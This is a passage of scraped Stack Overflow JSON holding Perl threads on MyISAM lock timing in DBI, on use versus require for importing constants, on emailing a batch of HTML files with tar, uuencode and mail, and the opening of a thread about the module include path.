{"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1495030840, "post_id": 44027479, "comment_id": 75081368, "body": "You&#39;ve missed out the <code>$sth-&gt;execute</code>."}, {"owner": {"reputation": 10803, "user_id": 2548147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cfKie.jpg?s=128&g=1", "display_name": "Raymond Nijland", "link": "https://stackoverflow.com/users/2548147/raymond-nijland"}, "edited": false, "score": 0, "creation_date": 1495031161, "post_id": 44027479, "comment_id": 75081625, "body": "MySQL will release the LOCK on the MyISAM table when the query is done executing..."}, {"owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1495031183, "post_id": 44027479, "comment_id": 75081649, "body": "@DaveCross Thanks, corrected."}, {"owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "reply_to_user": {"reputation": 10803, "user_id": 2548147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cfKie.jpg?s=128&g=1", "display_name": "Raymond Nijland", "link": "https://stackoverflow.com/users/2548147/raymond-nijland"}, "edited": false, "score": 0, "creation_date": 1495031226, "post_id": 44027479, "comment_id": 75081680, "body": "@RaymondNijland It would be an answer to my question if you&#39;d pointed when it is &quot;done executing&quot;: after <code>-&gt;execute</code> or after the <code>while</code> loop exits"}, {"owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 0, "creation_date": 1495032786, "post_id": 44027479, "comment_id": 75082964, "body": "Generally nothing is going to happen when &quot;prepare&quot; runs. &quot;execute&quot; will block until the entire query is finished."}, {"owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "reply_to_user": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 0, "creation_date": 1495032941, "post_id": 44027479, "comment_id": 75083080, "body": "@AKHolland Sorry, I should have said about <code>execute</code> not <code>prepare</code>. It is yet unclear for me whether the lock is freed after <code>execute</code> or after the <code>while</code> loop finishes (or in the middle)"}, {"owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 1, "creation_date": 1495033291, "post_id": 44027479, "comment_id": 75083380, "body": "Everything happens inside the &quot;execute&quot; statement. Before &quot;execute&quot;, nothing has been sent to the MySQL server. After &quot;execute&quot;, the query has completely finished, any locks cleared, and the entire result set is in the memory of the perl script."}, {"owner": {"reputation": 458675, "user_id": 20860, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/iavmP.jpg?s=128&g=1", "display_name": "Bill Karwin", "link": "https://stackoverflow.com/users/20860/bill-karwin"}, "edited": false, "score": 4, "creation_date": 1495033392, "post_id": 44027479, "comment_id": 75083449, "body": "@porton, you could test this for yourself. Put a sleep for 60 seconds after the execute but before your while loop. Run the script. While it&#39;s sleeping, open another window and see if you can update some rows in the table."}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1495083083, "post_id": 44027479, "comment_id": 75103788, "body": "You are testing another reason to move from MyISAM to InnoDB."}], "owner": {"reputation": 4450, "user_id": 856090, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/fa49a1c90a6af7544d764c5b22ff780d?s=128&d=identicon&r=PG", "display_name": "porton", "link": "https://stackoverflow.com/users/856090/porton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1495032873, "creation_date": 1495030755, "last_edit_date": 1495032873, "question_id": 44027479, "link": "https://stackoverflow.com/questions/44027479/until-when-a-myisam-table-is-locked", "title": "Until when a MyISAM table is locked?", "body": "<p>I execute an SQL query to a MyISAM table and read the results (the following code is Perl):</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare(\"SELECT field FROM table\");\n$sth-&gt;execute();\nwhile(my $h = $sth-&gt;fetchrow_hashref) {\n  # ...\n}\n</code></pre>\n\n<p>I know that MyISAM acquires a non-exclusive (\"read\") lock in the beginning of executing the <code>execute</code> statement.</p>\n\n<p>When the lock is released: after <code>execute</code> or after the <code>while</code> loop finishes iterating over all the rows? or maybe somewhere in the middle?</p>\n"}, {"tags": ["perl", "perl-module"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1495023889, "post_id": 44024700, "comment_id": 75075829, "body": "Which versions of Socket are those? Do you also have different versions of Perl? There is no <code>use strict</code>?"}, {"owner": {"reputation": 29, "user_id": 4255828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yTWJF.jpg?s=128&g=1", "display_name": "TOertel", "link": "https://stackoverflow.com/users/4255828/toertel"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495024053, "post_id": 44024700, "comment_id": 75075941, "body": "It&#39;s Socket 1.82 vs 2.010.  Obviously if I could upgrade the older version I would... but can&#39;t.  Yes, perl is also very different.  But test above runs same on both versions of perl."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1495024117, "post_id": 44024700, "comment_id": 75075987, "body": "You can tell us the Perl versions anyway. If you don&#39;t know the answer, don&#39;t assume you can decide which information is relevant to finding it. ;)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 4, "creation_date": 1495024282, "post_id": 44024700, "comment_id": 75076111, "body": "Why do you not want to do <code>use</code>? The difference between <code>use</code> and <code>require</code> is that <code>use</code> gets done at compile time, and <code>require</code> is not. So when you call <code>&quot; . MAGIC_CONST . &quot;</code> with the <code>require</code>, Perl does not know about the symbol <code>MAGIC_CONST</code> yet during the compilation phase, as the <code>require</code> will only be done at run time. Without <code>use strict</code>, barewords are treated as strings if they are not symbols, which explains why you see the text <code>MAGIC_CONST</code> instead of <code>42</code>."}, {"owner": {"reputation": 29, "user_id": 4255828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yTWJF.jpg?s=128&g=1", "display_name": "TOertel", "link": "https://stackoverflow.com/users/4255828/toertel"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1495024333, "post_id": 44024700, "comment_id": 75076148, "body": "perl 5.10.1 and perl 5.16.3"}, {"owner": {"reputation": 1242, "user_id": 7061430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81912bc5ca02376f99a5ee44531dee27?s=128&d=identicon&r=PG", "display_name": "nothingmuch", "link": "https://stackoverflow.com/users/7061430/nothingmuch"}, "edited": false, "score": 3, "creation_date": 1495024942, "post_id": 44024700, "comment_id": 75076586, "body": "I second the <code>use strict</code> suggestion. If you need more control than <code>use Mod</code>, then you can write <code>BEGIN { require Mod; Mod-&gt;import }</code> to ensure it happens early enough to get <code>MAGIC_CONST</code> defined during parsing. But why do you need that? Are you choosing which variant of Mod to load? This sounds a bit like an <a href=\"https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">X Y problem</a> to me."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 1242, "user_id": 7061430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81912bc5ca02376f99a5ee44531dee27?s=128&d=identicon&r=PG", "display_name": "nothingmuch", "link": "https://stackoverflow.com/users/7061430/nothingmuch"}, "edited": false, "score": 1, "creation_date": 1495025308, "post_id": 44024700, "comment_id": 75076896, "body": "I am also not entirely sure I understand the question. I&#39;ve explained the behavior in my comment above, but I am not sure that is sufficient to answer it. If it is, I&#39;ll convert it to an answer and flesh it out. However to answer the direct question, if you want it to behave like <code>use</code>, use <code>use</code> or do the <code>BEGIN { ... }</code> block like @nothingmuch suggested in their comment."}, {"owner": {"reputation": 29, "user_id": 4255828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yTWJF.jpg?s=128&g=1", "display_name": "TOertel", "link": "https://stackoverflow.com/users/4255828/toertel"}, "edited": false, "score": 0, "creation_date": 1495025728, "post_id": 44024700, "comment_id": 75077247, "body": "I&#39;m not clear on how <code>use strict</code> actually improves the situation.   I added my actual partial &quot;solution&quot;, to avoid the YX problem. ;)  I didn&#39;t appreciate the difference between the BEGIN{} and the post-BEGIN import."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1495029764, "post_id": 44024700, "comment_id": 75080526, "body": "I prefer and recommend <a href=\"https://www.nu42.com/2016/05/perl-define-constants.html\" rel=\"nofollow noreferrer\">the combination with <code>Const::Fast</code> and <code>Importer</code></a> rather than <code>constant.pm</code> for defining constants to be used by other modules. With <code>Const::Fast</code>, you can also namespace your constants to specific constant hashes."}, {"owner": {"reputation": 1242, "user_id": 7061430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81912bc5ca02376f99a5ee44531dee27?s=128&d=identicon&r=PG", "display_name": "nothingmuch", "link": "https://stackoverflow.com/users/7061430/nothingmuch"}, "edited": false, "score": 2, "creation_date": 1495030216, "post_id": 44024700, "comment_id": 75080897, "body": "<code>use strict</code> would avoid the interpretation of the bareword as a string, as explained in Adam&#39;s answer. This would have made it clearer that the constant is not actually imported until it&#39;s too late, even though the line that imports it appears sooner in the file. Wrapping the importing in a <code>BEGIN</code> block <a href=\"https://perldoc.perl.org/perlmod.html#BEGIN%2c-UNITCHECK%2c-CHECK%2c-INIT-and-END\" rel=\"nofollow noreferrer\">makes that execute at compile time</a>, which means Perl can then <a href=\"https://perldoc.perl.org/perldata.html#Identifier-parsing\" rel=\"nofollow noreferrer\">parse</a> the rest of the code interpreting those barewords as subroutine names."}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 4255828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yTWJF.jpg?s=128&g=1", "display_name": "TOertel", "link": "https://stackoverflow.com/users/4255828/toertel"}, "edited": false, "score": 0, "creation_date": 1495026933, "post_id": 44025357, "comment_id": 75078221, "body": "Updated question with a more concrete example of what I&#39;m trying to accomplish."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1495031638, "post_id": 44025357, "comment_id": 75082031, "body": "I&#39;ve added solutions."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1495031956, "post_id": 44025357, "comment_id": 75082306, "body": "This answer ignores the fact that the OP had <code>import</code> with their <code>require</code>. The rest is spot-on."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1495033816, "post_id": 44025357, "comment_id": 75083760, "body": "<code>sub MAGIC_CONST { 42 };</code> ... without the empty prototype, you give up the one advantage of constant subroutines, but retain all the gotchas and ugliness. <code>sub MAGIC_CONST () { 42 }</code>."}], "tags": [], "owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "is_accepted": true, "score": 4, "last_activity_date": 1495031569, "last_edit_date": 1495031569, "creation_date": 1495025312, "answer_id": 44025357, "question_id": 44024700, "link": "https://stackoverflow.com/questions/44024700/perl-use-vs-require-and-import-constants-are-only-functions/44025357#44025357", "title": "perl use vs require and import, constants are only functions", "body": "<p>The reason the <code>require</code> version prints <code>MAGIC_CONST</code> instead of <code>42</code> is because <code>use</code> is what tells perl to import the symbols from one module to another. Without the <code>use</code>, there is no function called <code>MAGIC_CONST</code> defined, so perl interprets it as a string instead. You should <code>use strict</code> to disable the automatic conversion of barewords like that into strings.</p>\n\n<pre><code>#!/usr/bin/env perl\nno strict;\n# forgot to define constant MAGIC_CONST...\nprint 'Not strict:' . MAGIC_CONST . \"\\n\";\n</code></pre>\n\n<p>produces</p>\n\n<blockquote>\n  <p>Not strict:MAGIC_CONST</p>\n</blockquote>\n\n<p>But</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\n# forgot to define constant MAGIC_CONST...\nprint 'Strict:' . MAGIC_CONST . \"\\n\";\n</code></pre>\n\n<p>Produces an error:</p>\n\n<blockquote>\n  <p>Bareword \"MAGIC_CONST\" not allowed while \"strict subs\" in use at\n  ./test.pl line 4. Execution of ./test.pl aborted due to compilation\n  errors.</p>\n</blockquote>\n\n<p>So if you want to use one module's functions in another, you either have to import them with <code>use</code>, or call them with the full package name:</p>\n\n<pre><code>package Foo;\nsub MAGIC_CONST { 42 };\n\npackage Bar;\nprint 'Foo from Bar: ' . Foo::MAGIC_CONST . \"\\n\";\n</code></pre>\n\n<blockquote>\n  <p>Foo from Bar: 42</p>\n</blockquote>\n\n<p>It's usually best to avoid conditionally importing things. You could resolve your problem as follows:</p>\n\n<pre><code>use Socket;\nif ($Socket::VERSION &gt; 1.96) {\n  setsockopt($s, SOL_SOCKET, Socket::SO_KEEPALIVE);\n}\n</code></pre>\n\n<p>If you truly want to import, you still need to do it at compile-time.</p>\n\n<pre><code>use Socket;\nuse constant qw( );\nBEGIN {\n  if ($Socket::VERSION &gt; 1.96) {\n     Socket-&gt;import(qw( SO_KEEPALIVE ));\n  } else {\n     constant-&gt;import({ SO_KEEPALIVE =&gt; undef });\n  }\n}\n\nsetsockopt($s, SOL_SOCKET, SO_KEEPALIVE) if defined(SO_KEEPALIVE);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1495039385, "post_id": 44028665, "comment_id": 75087500, "body": "I absolutely support <code>Const::Fast</code>, which I&#39;ve used for years without a problem."}], "tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 3, "last_activity_date": 1495034567, "last_edit_date": 1592644375, "creation_date": 1495033721, "answer_id": 44028665, "question_id": 44024700, "link": "https://stackoverflow.com/questions/44024700/perl-use-vs-require-and-import-constants-are-only-functions/44028665#44028665", "title": "perl use vs require and import, constants are only functions", "body": "<p><a href=\"https://stackoverflow.com/a/44025357/100754\">Adam's answer</a> gives a good explanation of what is going on and how to get the desired behavior. I am going to recommend not using <a href=\"https://metacpan.org/pod/constant\" rel=\"nofollow noreferrer\">constant.pm</a> to define symbolic names for constants. A fairly nice looking and convenient alternative with fewer gotchas is to use constants defined using <a href=\"https://metacpan.org/pod/Const::Fast\" rel=\"nofollow noreferrer\">Const::Fast</a> and allow them to be imported.</p>\n<p>In addition, by using <a href=\"https://metacpan.org/pod/Importer\" rel=\"nofollow noreferrer\">Importer</a> in the module which wants to import the constants, the module that defines the constants can avoid inheriting <a href=\"https://metacpan.org/pod/Exporter\" rel=\"nofollow noreferrer\">Exporter</a>'s heavy baggage, or having to use <code>Exporter</code>'s <code>import</code>.</p>\n<p>The fact that <code>Const::Fast</code> allows you to define real constant arrays and hashes is a bonus.</p>\n<p>For example:</p>\n<pre><code>package MyConstants;\n\nuse strict;\nuse warnings;\n\nuse Const::Fast;\nuse Socket;\n\nconst our @EXPORT =&gt; ();\nconst our @EXPORT_OK =&gt; qw(\n    %SOCKET_OPT\n);\n\nconst our %SOCKET_OPT =&gt; (\n    keep_alive =&gt; ($Socket::VERSION &gt; 1.96) ? Socket::SO_KEEPALIVE : undef,\n);\n\n__PACKAGE__;\n__END__\n</code></pre>\n<p>Using these constants in a script:</p>\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Socket;\nuse Importer 'MyConstants' =&gt; qw( %SOCKET_OPT );\n\nif ( defined $SOCKET_OPT{keep_alive} ) {\n    setsockopt($s, SOL_SOCKET, $SOCKET_OPT{keep_alive});\n}\n</code></pre>\n<p>As <a href=\"https://www.nu42.com/2016/05/perl-define-constants.html\" rel=\"nofollow noreferrer\">I note in my blog post</a>:</p>\n<blockquote>\n<p>f I want to read the constants from a configuration file, that's trivial. If I want to export them to JSON, YAML, INI, or whatever else, that's also trivial. I can interpolate them willy-nilly.</p>\n<p>For those who have taken seriously <code>Exporter</code>'s stance against exporting variables, this takes some getting used to. Keep in mind that the admonition is there to make sure you don't write code that willy nilly modifies global variables. However, in this case, the variables we are exporting are not modifiable. Maybe you can convince yourself that the concern really does not apply in this instance. If you try to refer to a non-existent constant, you get an error (albeit during run time) ...</p>\n</blockquote>\n<p>In most cases, the benefits of this approach outweigh the speed penalty of not using <code>constant.pm</code>.</p>\n"}], "owner": {"reputation": 29, "user_id": 4255828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yTWJF.jpg?s=128&g=1", "display_name": "TOertel", "link": "https://stackoverflow.com/users/4255828/toertel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 771, "favorite_count": 0, "accepted_answer_id": 44025357, "answer_count": 2, "score": -1, "last_activity_date": 1495034663, "creation_date": 1495023609, "last_edit_date": 1495034663, "question_id": 44024700, "link": "https://stackoverflow.com/questions/44024700/perl-use-vs-require-and-import-constants-are-only-functions", "title": "perl use vs require and import, constants are only functions", "body": "<p>I've got a Perl script that I'm trying to make compatible with two different Perl environments.  To work around the two different versions of Socket I have, I'm doing a little hackery with require and import.  I've got it working, but I'm not happy with the behavior.</p>\n\n<p>Mod.pm:</p>\n\n<pre><code>package Mod;\nuse base 'Exporter';\nour @EXPORT = qw( MAGIC_CONST );\nsub MAGIC_CONST() { 42; }\n</code></pre>\n\n<p>test.pl:</p>\n\n<pre><code>use Mod;\n#require Mod;\n#import Mod;\n\nprintf \"MAGIC_CONST = \". MAGIC_CONST .\"\\n\";\nprintf \"MAGIC_CONST = \". MAGIC_CONST() .\"\\n\";\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>MAGIC_CONST = 42\nMAGIC_CONST = 42\n</code></pre>\n\n<p>But using the 'require' and 'import' instead, I get this:</p>\n\n<p>Output:</p>\n\n<pre><code>MAGIC_CONST = MAGIC_CONST\nMAGIC_CONST = 42\n</code></pre>\n\n<p>So the question is: Is there a clean way I can get the normal behavior of the constants?  I can certainly do <code>sub MAGIC_CONST { Mod::MAGIC_CONST(); }</code> but that's pretty ugly.</p>\n\n<p>What I'm actually doing is something like this:</p>\n\n<pre><code>use Socket;\nif ($Socket::VERSION &gt; 1.96) {\n  import Socket qw(SO_KEEPALIVE); # among others\n  setsockopt($s, SOL_SOCKET, SO_KEEPALIVE); # among others\n}\n</code></pre>\n"}, {"tags": ["html", "c", "linux", "perl", "shell"], "comments": [{"owner": {"reputation": 10709, "user_id": 3212865, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/B6qLg.jpg?s=128&g=1", "display_name": "spectras", "link": "https://stackoverflow.com/users/3212865/spectras"}, "edited": false, "score": 0, "creation_date": 1495013344, "post_id": 44020658, "comment_id": 75068623, "body": "That depends on how you want to transfer. Given like this, a simple ZIP archive seems to do the job in a pretty portable way."}, {"owner": {"reputation": 45, "user_id": 7892746, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/41310627d746b07402b15829c958043e?s=128&d=identicon&r=PG&f=1", "display_name": "mmaz", "link": "https://stackoverflow.com/users/7892746/mmaz"}, "reply_to_user": {"reputation": 10709, "user_id": 3212865, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/B6qLg.jpg?s=128&g=1", "display_name": "spectras", "link": "https://stackoverflow.com/users/3212865/spectras"}, "edited": false, "score": 0, "creation_date": 1495014248, "post_id": 44020658, "comment_id": 75069266, "body": "does it means that zip all the 20 files, then send it through email?"}, {"owner": {"reputation": 10709, "user_id": 3212865, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/B6qLg.jpg?s=128&g=1", "display_name": "spectras", "link": "https://stackoverflow.com/users/3212865/spectras"}, "edited": false, "score": 0, "creation_date": 1495014876, "post_id": 44020658, "comment_id": 75069700, "body": "Or whatever other exchange means you have. With no more information on your environment it&#39;s hard to tell. You could push it to an SMB share, upload it through FTP, pipe it through the network... For all we know you could be talking about the to OS on the same system so you could just copy over the zip file to a common partition before rebooting."}], "answers": [{"tags": [], "owner": {"reputation": 407, "user_id": 3807678, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/100000301923853/picture?type=large", "display_name": "codelyzer", "link": "https://stackoverflow.com/users/3807678/codelyzer"}, "is_accepted": false, "score": -2, "last_activity_date": 1495014870, "creation_date": 1495014870, "answer_id": 44021465, "question_id": 44020658, "link": "https://stackoverflow.com/questions/44020658/how-do-i-transfer-20-html-files-from-linux-to-windows-in-a-single-csh-perl-pyth/44021465#44021465", "title": "How do i transfer 20 .html files from Linux to Windows in a single csh/perl/python script?", "body": "<p>You can use smtp library in python and send an email with multiple attachments. All you have to do is get all your files into your python script by using directory modules and then simply send an email. </p>\n\n<p>Here is a link to the tutorial on how to send emails using python:</p>\n\n<p><a href=\"http://naelshiab.com/tutorial-send-email-python/\" rel=\"nofollow noreferrer\">http://naelshiab.com/tutorial-send-email-python/</a></p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1495025054, "creation_date": 1495025054, "answer_id": 44025251, "question_id": 44020658, "link": "https://stackoverflow.com/questions/44020658/how-do-i-transfer-20-html-files-from-linux-to-windows-in-a-single-csh-perl-pyth/44025251#44025251", "title": "How do i transfer 20 .html files from Linux to Windows in a single csh/perl/python script?", "body": "<p>Stick 'tar' in front:</p>\n\n<pre><code>tar cvfz - ./path_to_files | uuencode stuff.tar.gz | mail -s \"attachmentname\" email@yahoo.com\n</code></pre>\n\n<p><code>-</code> 'prints' the <code>tar</code> to STDOUT and thus fed into uuencode. And gzips it, which might save some space. (You could probably use <code>zip</code> instead I'd imagine if zip files are easier to handle)</p>\n"}], "owner": {"reputation": 45, "user_id": 7892746, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/41310627d746b07402b15829c958043e?s=128&d=identicon&r=PG&f=1", "display_name": "mmaz", "link": "https://stackoverflow.com/users/7892746/mmaz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1495025054, "creation_date": 1495012951, "question_id": 44020658, "link": "https://stackoverflow.com/questions/44020658/how-do-i-transfer-20-html-files-from-linux-to-windows-in-a-single-csh-perl-pyth", "title": "How do i transfer 20 .html files from Linux to Windows in a single csh/perl/python script?", "body": "<p>I am working on getting multiple .html files from Linux environment to Windows. For now, the easiest way that I've been using is uuencode command. </p>\n\n<p>However, since I have 20 .html files, I used two .csh files as only 10 files can run at a time. If I combine all 20.html files, it will return error: Too many arguments. This may be due to the long directories of each .html files.</p>\n\n<p>For example, this is the uuencode commands that I used in Lintowin.csh for 10 .html files:</p>\n\n<pre><code>(uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_A/output_A/summary.html A.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_B/output_B/summary.html B.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_C/output_C/summary.html C.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_D/output_D/summary.html D.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_E/output_E/summary.html E.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_F/output_F/summary.html F.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_G/output_G/summary.html G.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_H/output_H/summary.html H.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_I/output_I/summary.html I.xls;uuencode /main/fileno/no1/user/username/mainproject/projectname/division/parts/sub/16_april/fullreport/part_report/report_J/output_J/summary.html J.xls) | \\mail -s \"attachmentname\" email@yahoo.com\n</code></pre>\n\n<p>The format is \n(uuencode file_path file_format_in_Windows) | \\mail -s \"attachment name\" receiver_email</p>\n\n<p>Is there any way on how I can fix this and make it more simpler since I need to automate this action. Is there any way I can use perl script or other command so that i can transfer all 20 .html files at a time?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 2, "creation_date": 1495009593, "post_id": 44019379, "comment_id": 75065875, "body": "it is the include path for perl modules"}, {"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 